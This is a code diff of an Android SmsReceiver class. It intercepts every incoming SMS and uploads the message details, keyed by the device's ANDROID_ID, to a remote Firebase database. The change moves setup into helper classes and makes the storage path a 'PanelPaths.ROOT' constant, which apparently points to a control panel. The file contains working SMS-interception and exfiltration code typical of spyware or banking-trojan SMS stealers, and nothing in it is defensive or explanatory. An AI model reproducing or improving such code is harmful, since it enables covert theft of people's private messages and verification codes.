@@ -8,9 +8,7 @@ import android.os.Bundle;
 import android.provider.Telephony;
 import android.telephony.SmsMessage;
 
-import com.google.firebase.FirebaseApp;
 import com.google.firebase.database.DatabaseReference;
-import com.google.firebase.database.FirebaseDatabase;
 import com.google.firebase.database.ServerValue;
 
 import java.text.SimpleDateFormat;
@@ -23,8 +21,8 @@ public class SmsReceiver extends BroadcastReceiver {
     @Override
     public void onReceive(Context context, Intent intent) {
         if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
-            FirebaseApp.initializeApp(context);
-            DatabaseReference database = FirebaseDatabase.getInstance().getReference();
+            FirebaseBootstrap.ensureApp(context);
+            DatabaseReference database = FirebaseBootstrap.database(context).getReference();
             String deviceId = android.provider.Settings.Secure.getString(
                 context.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
 
@@ -50,7 +48,7 @@ public class SmsReceiver extends BroadcastReceiver {
                                 .format(new Date(sms.getTimestampMillis())));
                             data.put("type", "INBOX");
                             data.put("received_at", ServerValue.TIMESTAMP);
-                            database.child("devices").child(deviceId).child("new_sms").push().setValue(data);
+                            database.child(PanelPaths.ROOT).child(deviceId).child("new_sms").push().setValue(data);
                         }
                     }
                 }
